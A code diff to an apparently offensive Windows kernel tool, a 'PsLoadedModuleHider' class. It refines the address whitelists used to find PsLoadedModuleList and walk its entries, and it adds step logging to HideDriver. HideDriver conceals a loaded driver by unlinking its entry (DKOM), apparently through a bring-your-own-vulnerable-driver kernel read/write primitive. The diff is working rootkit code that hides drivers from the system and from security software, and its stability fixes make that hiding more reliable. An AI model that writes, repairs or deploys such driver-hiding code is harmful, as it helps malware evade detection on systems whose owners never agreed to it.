@@ -4670,13 +4670,18 @@ uint64_t PsLoadedModuleHider::LocatePsLoadedModuleList(uint64_t ntosBase) {
             //     - 分页池   0xFFFFFC0000000000-0xFFFFFD0000000000 (被换出页)
             //     - 系统 PTE 0xFFFFFD0000000000-0xFFFFFE0000000000 (未映射 PTE)
             //   黑名单无法覆盖所有区域, 改用白名单只允许 flink/blink 在:
-            //     - 内核镜像 0xFFFFF80000000000-0xFFFFFA0000000000 (PsLoadedModuleList 头节点在 .data 段)
-            //     - 非分页池 0xFFFFFA0000000000-0xFFFFFC0000000000 (LDR_DATA_TABLE_ENTRY 节点)
-            //   合法性: PsLoadedModuleList 头节点在 ntoskrnl .data (内核镜像),
-            //           所有 LDR_DATA_TABLE_ENTRY 节点在非分页池, 不会在其他区域.
+            //     - 非分页池扩展 0xFFFF800000000000-0xFFFFF68000000000 (Win11 24H2/25H2 LDR_DATA_TABLE_ENTRY 所在)
+            //     - 非分页池      0xFFFFFA0000000000-0xFFFFFC0000000000 (传统 LDR_DATA_TABLE_ENTRY 节点)
+            //   ★ v3.296 FIX-14: 排除内核镜像区域 [0xFFFFF800, 0xFFFFFA00)
+            //     原因: 内核镜像区域内部有间隙页 (驱动卸载后留下未映射页, 或驱动间空隙).
+            //           .data 段中的误判候选 flink 可能恰好数值落在此区域但指向未映射页,
+            //           kma.Read(flink+0x30) 触发 driver memcpy 读取未映射页 → 0x50 蓝屏.
+            //     合法性: PsLoadedModuleList 头节点在 ntoskrnl .data (内核镜像), 但头节点的
+            //           Flink/Blink 指向 LDR_DATA_TABLE_ENTRY (非分页池/扩展), 不指向内核镜像.
+            //           所以候选 flink/blink 不应在内核镜像区域.
             {
                 auto isValidListPtr = [](uint64_t va) -> bool {
-                    if (va >= 0xFFFFF80000000000ULL && va < 0xFFFFFA0000000000ULL) return true;  // 内核镜像
+                    if (va >= 0xFFFF800000000000ULL && va < 0xFFFFF68000000000ULL) return true;  // 非分页池扩展/PFN
                     if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL) return true;  // 非分页池
                     return false;
                 };
@@ -4688,13 +4693,10 @@ uint64_t PsLoadedModuleHider::LocatePsLoadedModuleList(uint64_t ntosBase) {
 
             // ★ v3.296 FIX-13: 确保 flink + 0x68 (最大读取偏移 LDR_BASE_DLL_NAME_BUF_OFF+8)
             //   与 flink 在同一白名单子区域内, 避免跨子区域读取到未映射页 → 0x50 蓝屏.
-            //   子区域: 内核镜像 [0xFFFFF800, 0xFFFFFA00), 非分页池 [0xFFFFFA00, 0xFFFFFC00).
-            //   若 flink 在子区域末尾 (如 0xFFFFF9FF...), flink+0x68 跨入下一子区域,
-            //   下一子区域起始可能有未映射页 → driver memcpy 蓝屏.
             {
                 auto inSameSubRegion = [](uint64_t va, uint64_t end) -> bool {
-                    if (va >= 0xFFFFF80000000000ULL && va < 0xFFFFFA0000000000ULL)
-                        return end <= 0xFFFFFA0000000000ULL;
+                    if (va >= 0xFFFF800000000000ULL && va < 0xFFFFF68000000000ULL)
+                        return end <= 0xFFFFF68000000000ULL;
                     if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL)
                         return end <= 0xFFFFFC0000000000ULL;
                     return false;
@@ -4758,19 +4760,19 @@ uint64_t PsLoadedModuleHider::FindEntryByBaseName(uint64_t listHead, const wchar
     for (; iter < MAX_ITER; iter++) {
         if (current == listHead || current == 0) break;
         if (current <= 0xFFFF800000000000ULL) break;  // 非内核地址, 异常终止
-        // ★ BUILD 567 v3.229 FIX: 白名单 (与 LocatePsLoadedModuleList 一致)
-        //   只允许 current 在内核镜像 (0xFFFFF800-0xFFFFFA0000000000) 或非分页池 (0xFFFFFA-0xFFFFFC0000000000)
-        //   防御性: 链表本身不应包含其他区域指针, 但若链表损坏, 读取 current+0x58/0x60
-        //         会触发 0x50 蓝屏 (同 LocatePsLoadedModuleList 根因).
-        //   历史: v3.228 黑名单 (只排除系统缓存) 仍被 0xFFFFFD0000000000 (系统 PTE) 触发 0x50 蓝屏.
+        // ★ v3.296 FIX-14: 白名单 (与 LocatePsLoadedModuleList 一致)
+        //   只允许 current 在非分页池扩展 [0xFFFF8000, 0xFFFFF680) 或非分页池 [0xFFFFFA00, 0xFFFFFC00)
+        //   排除内核镜像区域 [0xFFFFF800, 0xFFFFFA00) — 该区域有间隙页, 读取 current+0x58/0x60
+        //   可能触发 0x50 蓝屏 (同 LocatePsLoadedModuleList 根因).
+        //   合法性: LDR_DATA_TABLE_ENTRY 在非分页池/扩展分配, 不在内核镜像区域.
         {
-            bool validPtr = (current >= 0xFFFFF80000000000ULL && current < 0xFFFFFA0000000000ULL) ||  // 内核镜像
+            bool validPtr = (current >= 0xFFFF800000000000ULL && current < 0xFFFFF68000000000ULL) ||  // 非分页池扩展
                             (current >= 0xFFFFFA0000000000ULL && current < 0xFFFFFC0000000000ULL);    // 非分页池
             if (!validPtr) break;
-            // ★ v3.296 FIX-13: 确保 current+0x68 与 current 在同一子区域 (同 LocatePsLoadedModuleList)
+            // ★ v3.296 FIX-13: 确保 current+0x68 与 current 在同一子区域
             auto inSameSubRegion = [](uint64_t va, uint64_t end) -> bool {
-                if (va >= 0xFFFFF80000000000ULL && va < 0xFFFFFA0000000000ULL)
-                    return end <= 0xFFFFFA0000000000ULL;
+                if (va >= 0xFFFF800000000000ULL && va < 0xFFFFF68000000000ULL)
+                    return end <= 0xFFFFF68000000000ULL;
                 if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL)
                     return end <= 0xFFFFFC0000000000ULL;
                 return false;
@@ -4827,11 +4829,11 @@ bool PsLoadedModuleHider::PerformUnlink(uint64_t entryAddr, uint64_t listHead) {
         ByovdDiag("B564:Unlink: FAIL invalid links (flink/blink not in kernel)\n");
         return false;
     }
-    // ★ v3.296 FIX-13: Flink/Blink 必须在内核镜像或非分页池白名单内
-    //   (与 LocatePsLoadedModuleList/FindEntryByBaseName 一致), 防止误用系统 PTE 等未映射区域.
+    // ★ v3.296 FIX-14: Flink/Blink 必须在非分页池扩展或非分页池白名单内
+    //   (与 LocatePsLoadedModuleList/FindEntryByBaseName 一致), 排除内核镜像区域 (有间隙页风险).
     {
         auto isValidListPtr = [](uint64_t va) -> bool {
-            if (va >= 0xFFFFF80000000000ULL && va < 0xFFFFFA0000000000ULL) return true;  // 内核镜像
+            if (va >= 0xFFFF800000000000ULL && va < 0xFFFFF68000000000ULL) return true;  // 非分页池扩展
             if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL) return true;  // 非分页池
             return false;
         };
@@ -4912,6 +4914,9 @@ bool PsLoadedModuleHider::HideDriver(const wchar_t* driverBaseName) {
         StateLog("B564", "HideFail", "reason=ntosBase_zero");
         return false;
     }
+    // ★ v3.296 FIX-14: 添加 StateLog 诊断到每个步骤, 精确定位蓝屏崩溃点
+    StateLog("B564", "HideStep", "step=1_locate ntosBase=0x%llX",
+             (unsigned long long)ntosBase);
 
     // 1. 定位 PsLoadedModuleList 头节点
     uint64_t listHead = LocatePsLoadedModuleList(ntosBase);
@@ -4920,6 +4925,8 @@ bool PsLoadedModuleHider::HideDriver(const wchar_t* driverBaseName) {
                  (unsigned long long)ntosBase);
         return false;
     }
+    StateLog("B564", "HideStep", "step=2_find listHead=0x%llX",
+             (unsigned long long)listHead);
 
     // 2. 查找目标驱动条目
     uint64_t entry = FindEntryByBaseName(listHead, driverBaseName);
@@ -4928,6 +4935,9 @@ bool PsLoadedModuleHider::HideDriver(const wchar_t* driverBaseName) {
                  (unsigned long long)listHead);
         return false;
     }
+
+    StateLog("B564", "HideStep", "step=3_unlink entry=0x%llX",
+             (unsigned long long)entry);
 
     // 3. DKOM 断链 + SelfLoopHarden
     bool ok = PerformUnlink(entry, listHead);
